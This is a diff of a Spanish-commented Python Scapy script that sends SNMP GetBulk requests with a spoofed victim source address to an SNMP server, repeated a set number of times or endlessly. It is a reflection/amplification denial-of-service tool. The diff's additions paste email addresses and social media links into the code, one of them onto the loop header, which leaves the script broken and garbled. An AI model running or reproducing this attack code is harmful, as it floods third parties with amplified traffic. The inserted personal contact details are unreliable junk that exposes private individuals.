@@ -39,7 +39,8 @@ else:
     communi= args['community']
 
 if args['count'] == "X" or args['count'] == "x": # Si se ingresa x o X se enviara infinitos paquetes
-      while (1 == 1):
+      while (1 == 1):cezar_lin_tu@hotmail.com
+      lindis-cr@hotmail.com https://twitter.com/cezarlintu https://www.facebook.com/Cezarlintu https://www.facebook.com/herlinda.castuloramirez
         w =IP(dst=args['snmp_server'],src=args['victim_IP'])/UDP(sport=RandShort(),dport=uport)/SNMP(version="v2c",community=communi,PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)), SNMPvarbind(oid=ASN1_OID(oid))]))# Esta linea construye el paquete SNMP utilizando los argumentos ingresados
         send(w,  verbose=0) # Envia el paquete
         iterationCount = iterationCount + 1
@@ -49,6 +50,6 @@ else: # Se ejecuta si el usuario digita la cantidad de paquetes que va enviar
         w =IP(dst=args['snmp_server'],src=args['victim_IP'])/UDP(sport=RandShort(),dport=uport)/SNMP(version="v2c",community=communi,PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)),SNMPvarbind(oid=ASN1_OID(oid) )]))# Se envia paquete SNMP  utilizando los argumentos ingresados
         send(w,  verbose=0) # Envia el paquete
         iterationCount = iterationCount + 1
+        https://www.facebook.com/sergio.rosalesramirez
         print(str(iterationCount) + " Paquete enviado")
 print("Todos los paquetes fueron enviados exitosamente.")# Mensaje mostrado cuando todos los paquetes han sido enviados
-
